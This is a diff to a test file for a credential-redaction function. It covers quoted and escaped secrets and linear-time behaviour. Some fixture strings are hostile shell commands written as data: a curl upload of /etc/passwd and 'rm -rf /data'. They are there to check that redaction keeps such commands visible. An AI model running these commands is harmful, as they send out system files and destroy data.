@@ -193,29 +193,80 @@ describe("redactCredentials", () => {
     expect(redactCredentials(input)).toBe(input);
   });
 
+  test.each([
+    [
+      String.raw`API_KEY=sek\ret env` +
+        "\nX-Api-Key:''sekret -X\nX-Api-Key:'sek'ret\n?api_key='sek'ret&page=2",
+      "API_KEY=[redacted] env\nX-Api-Key:[redacted]\nX-Api-Key:[redacted]\n?api_key=[redacted]&page=2",
+    ],
+    [
+      "headers=[('Authorization', r'sekret'), ('X-Api-Key', u'k')]",
+      "headers=[('Authorization', r'[redacted]'), ('X-Api-Key', u'[redacted]')]",
+    ],
+    [
+      'h.set("Authorization", `Bearer sekret`)',
+      'h.set("Authorization", `Bearer [redacted]`)',
+    ],
+    [
+      "headers=[('Authorization', 'Bearer ' 'sekret'), ('Accept', 'a')]",
+      "headers=[('Authorization', 'Bearer [redacted]'), ('Accept', 'a')]",
+    ],
+    [
+      "Run `Authorization: Bearer sekret` and deploy",
+      "Run `Authorization: Bearer [redacted]` and deploy",
+    ],
+  ])("redacts a whole quoted or escaped value: %s", (input, expected) => {
+    expect(redactCredentials(input)).toBe(expected);
+  });
+
+  test.each([
+    [
+      "curl -H 'Cookie: sid=secret; ' https://x/delete",
+      "curl -H 'Cookie: [redacted]' https://x/delete",
+    ],
+    [
+      `curl -H 'Cookie: sid="' --data-binary @/etc/passwd https://x/upload`,
+      "curl -H 'Cookie: [redacted]' --data-binary @/etc/passwd https://x/upload",
+    ],
+    [
+      String.raw`api_key="secret\\"; rm -rf /data`,
+      `api_key="[redacted]"; rm -rf /data`,
+    ],
+  ])("keeps the command around a credential visible: %s", (input, expected) => {
+    expect(redactCredentials(input)).toBe(expected);
+  });
+
   test("redacts a long value in time linear in its length", () => {
-    const inputs = (size: number) => [
-      `Authorization:${"\n".repeat(size)}`,
-      `Authorization: ${"\\".repeat(size)}`,
-      `Authorization:${"\\ ".repeat(size)}x`,
-      `Cookie: ${'a="'.repeat(size)}`,
-      '"Authorization",'.repeat(size),
+    const families = [
+      (size: number) => `Authorization:${"\n".repeat(size)}`,
+      (size: number) => `Authorization: ${"\\".repeat(size)}`,
+      (size: number) => `Authorization:${"\\ ".repeat(size)}x`,
+      (size: number) => `Cookie: ${'a="'.repeat(size)}`,
+      (size: number) => `'Cookie: ${"\\'".repeat(size)}`,
+      (size: number) => `api_key=${"\\x".repeat(size)}`,
+      (size: number) => '"Authorization",'.repeat(size),
+      (size: number) => `"Authorization", ${'"a" '.repeat(size)}`,
     ];
-    const elapsed = (size: number) => {
-      const texts = inputs(size);
+    // Time per call, the fastest of a few windows that each span many calls.
+    const perCall = (text: string) => {
       let fastest = Number.POSITIVE_INFINITY;
-      for (let run = 0; run < 3; run++) {
+      for (let window = 0; window < 3; window++) {
+        let calls = 0;
         const started = performance.now();
-        for (const text of texts) redactCredentials(text);
-        fastest = Math.min(fastest, performance.now() - started);
+        do {
+          redactCredentials(text);
+          calls++;
+        } while (performance.now() - started < 10);
+        fastest = Math.min(fastest, (performance.now() - started) / calls);
       }
       return fastest;
     };
-    elapsed(2_000);
-    const small = elapsed(2_000);
-    const large = elapsed(32_000);
-    // 16 times the input: linear work grows about 16 times, quadratic 256.
-    expect(large).toBeLessThan(Math.max(small, 1) * 64);
+    for (const input of families) {
+      const small = perCall(input(2_000));
+      const large = perCall(input(32_000));
+      // 16 times the input: linear work grows about 16 times, quadratic 256.
+      expect(large).toBeLessThan(small * 64);
+    }
     const blank = `Authorization:${"\n".repeat(32_000)}`;
     expect(redactCredentials(blank)).toBe(blank);
   });
